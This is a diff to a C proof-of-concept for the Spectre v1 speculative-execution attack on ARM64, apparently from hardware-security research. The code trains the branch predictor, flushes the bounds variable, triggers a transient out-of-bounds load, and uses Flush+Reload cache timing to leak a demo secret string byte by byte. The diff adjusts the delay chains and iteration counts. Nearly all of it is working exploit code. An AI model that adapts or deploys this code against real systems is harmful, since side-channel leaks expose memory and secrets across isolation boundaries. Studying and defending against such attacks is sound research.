@@ -7,7 +7,7 @@
 
 #define STRIDE 4096
 #define RELOAD_BUF_SIZE STRIDE * 256
-#define ITER 400
+#define ITER 100
 
 #define MOV(n)	\
 	asm volatile(	\
@@ -25,6 +25,15 @@
         :: "i" (n) \
     )
 
+#define EORS(n) \
+    asm volatile( \
+        ".rept %0\n" \
+        "eor x10, x10, #1\n" \
+        ".endr\n" \
+        :: "i" (n) \
+		:"x10" \
+    )
+
 #define ADDS(n) \
     asm volatile( \
         ".rept %0\n" \
@@ -37,110 +46,93 @@
 #define REPEAT_16(x)  x x x x x x x x x x x x x x x
 #define REPEAT_8(x)  x x x x x x x x
 
-static unsigned char size = 16;
-static unsigned char *size_ptr = &size;
-static unsigned char **size_ptr_ptr= &size_ptr;
-static unsigned char ***size_ptr_ptr_ptr= &size_ptr_ptr;
-static unsigned int cachemiss __attribute__((aligned(4096))) = 16;
+static unsigned int size __attribute__((aligned(4096))) = 16;
+static unsigned int *size_ptr1 = &size;
+static unsigned int **size_ptr2 = &size_ptr1;
+static unsigned int ***size_ptr3 = &size_ptr2;
+static unsigned int ****size_ptr4 = &size_ptr3;
+static unsigned int *****size_ptr5 = &size_ptr4;
+static unsigned int ******size_ptr6 = &size_ptr5;
+static unsigned int *******size_ptr7 = &size_ptr6;
+static unsigned int ********size_ptr8 = &size_ptr7;
+static unsigned int *********size_ptr9 = &size_ptr8;
+static unsigned int **********size_ptr10 = &size_ptr9;
+static unsigned int ***********size_ptr11 = &size_ptr10;
+static unsigned int ************size_ptr12 = &size_ptr11;
+static unsigned int *************size_ptr13 = &size_ptr12;
 uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t *reloadbuffer;
-char *secret = "123457812345678";
+unsigned char *memory;
+char *secret = "SPECTRE_EXECUTE!";
+static unsigned char data __attribute__((aligned(4096))) = 32;
 static volatile uint8_t pick = 0; 
-uint64_t dummy[100] = {0};
-double num = 3.1415926;
-double divi = 1.1234567;
 
 /*
  * Measure the latency: check whether dco kicks in
  */
-static inline __attribute__((always_inline)) void measure_time() {
-	uint64_t init;
-	uint64_t end;
-	volatile uint64_t pick;
-	asm volatile(
-	"ldr x1, %[val]\n"
-	:
-	:[val] "m" (pick)
-	: "x1"
-	);
-	for(volatile int z = 0; z < 100; z++){}
-	isb();
-
-	init = get_cycles();
-	MOV(200);
-	asm volatile(
-	"adds x1, x1, #1\n"
-	::: "x1"
-	);
-	end = get_cycles();
-	isb();
-
-	asm volatile(
-	"str x1, %[val]\n"
-	:
-	: [val] "m" (pick)
-	: "x1"
-	);
-	        printf("%ld\n", end - init);
-	}
 
 
 static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
-	//size[0] = 0;
-	//pick = size[0];
-	unsigned char branch = 16;
-	pick = *size_ptr;
-	isb();
+//	volatile size_t dummy = *************size_ptr13;
+	asm volatile("movi d0, #0\n\r");
+#ifdef N
+	MOV(N);
+#endif
+	cacheflush(&size);
 	asm volatile(
-		"ldr d0, %[num]\n\r"
-		"ldr d1, %[div]\n\r"
-		"mov x10, #0\n\r"
-		::[num] "m" (num), [div] "m" (divi)
-		:"d0", "d1", "x10", "memory"
+		"mov x2, #0\n\r"
+		"mov x3, #0\n\r"
+		"mov x4, #0\n\r"
+		"mov x5, #0\n\r"
+		:::"x2"
 	);
-	pick = cachemiss;
-	//size[0] = 0;
-	//size = 16;
+//	dummy = *************size_ptr13;
+	isb();
+
 	/*
 	 * Spectre v1 runahead
 	 */
-	//branch = **size_ptr_ptr;
-	asm volatile (
-    	"mov x0, %0\n\r"  
-		"fdiv d0, d0, d1\n\r"
-		"fcvtzs x2, d0\n\r"
-		"mul x2, x2, x10\n\r"
-//		"mov x2, #0\n\r"
-		"adds x0, x0, x2\n\r"
-//		"ldr x0, [x0]\n\r"
-//		"mov x10, x10\n\r"
-//		"ldr x0, [x0]\n\r"
-//		"mov x10, x10\n\r"
-		"ldr %0, [x0]\n\r"
-    	: "=r" (branch)
-    	: "r" (&size) 
-    	: "x0"                
-	);
-	if (index < branch)
+	
+//	pick = fake_buffer[index];
+//	for(int i = 0; i < 1024; i++){
+//		pick = memory[i * 64];
+//	}
+//	asm volatile("mov x2, #0\n\r");
+//	if (index < *************size_ptr13)
+	if(index < size)
 	{	
-		MOV(20);
+		asm volatile (
+//			"fcvtzs x2, d0\n\r"
+//			"adds %[index], %[index], x2\n\r"
+//			"mov x2, #0\n\r"
+			".rept 100\n\r"
+//			"eor %[index], %[index], x2\n\r" 
+			"eor x2, x2, #1\n\r"
+			"eor x5, x5, x2\n\r"
+			"eor x3, x3, x5\n\r"
+			"eor x4, x4, x3\n\r"
+			".endr\n\r"
+			"add %[index], %[index], x4\n\r"
+    		: [index] "+r" (index)        
+    		:                            
+    		: "x2", "x3", "x4", "x5"                      
+		);
 		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
-	//measure_time();
 }
-
 
 static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *byte) {
 	int index, max = 0;
 	size_t train_index, probe_addr;
 	int results[256];
 	int hit = 0;
+
+
 	int random_int;
 	uint64_t init, end;
-	
+
 	memset(results, 0 , sizeof(int) * 256);
-	REPEAT_16(
-	for (int tries = ITER / 8; tries > 0; tries--) {
+	for (int tries = ITER; tries > 0; tries--) {
 
 		/*
 		 * flush reload buffer
@@ -148,24 +140,25 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 		for (int i = 0; i < 256; i++)
 			cacheflush(&reloadbuffer[i * STRIDE]); 
 
-		train_index = tries % 16;
+		train_index = tries % size;
 		for (int j = 0; j <= 10; j++) {
 
 			/*
 			 *poison branch predictor
 			 */
-			random_int = random(5, 9);
+			random_int = random(5, 7);
 			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
 			probe_addr = (probe_addr | (probe_addr >> 8)); 
 			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
+//			cacheflush(&data);
 //			cacheflush(&size);
-			cacheflush(&cachemiss);
-			//for(volatile int z = 0; z < 100; z++){}
+			for(volatile int z = 0; z < 100; z++){}
 			isb();
-	//		pick = data;
+			EORS(300);
+			//pick = data;
 			spectre_v1(probe_addr);
 		}
-		
+
 		/*
 		 * reload reload buffer 
 		 */
@@ -178,12 +171,11 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 			pick = reloadbuffer[index * STRIDE];
 			end = get_cycles();
 			isb();
-			if (end - init <= 190 && index != fake_buffer[tries % 16])
+			if (end - init <= 190 && index != fake_buffer[tries % size])
 				results[index]++; 
 		}
 
 	}
-	);
 
 	max = results[0];
 	for(int m = 0; m < 256; m++){
@@ -192,19 +184,19 @@ static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *b
 			hit = m;
 		}
 	}
-	printf("cache hit: %c, %x, hitrate: %f\n", (uint8_t)hit, hit, (double)results[hit] / 800);
+	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
 	*byte = (uint8_t)hit;
 }
 
 int main(int argc, const char * * argv) {
 	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
-	//size = (unsigned char *)mmap(0, 10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-	//size = (unsigned char *)malloc(10);
+	memory = (unsigned char *)mmap(0, 64 * 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+
 	size_t offset = (size_t)(secret - (char *)fake_buffer);
 	int secret_len = strlen(secret);
 	uint8_t byte;
 	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
-	//memset(size, 0x10, 10);
+	memset(memory, 1, sizeof(unsigned char) * 64 * 1024);
 
 	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);
 
@@ -242,4 +234,3 @@ int main(int argc, const char * * argv) {
 	leaked = NULL;
 	return 0;
 }
-
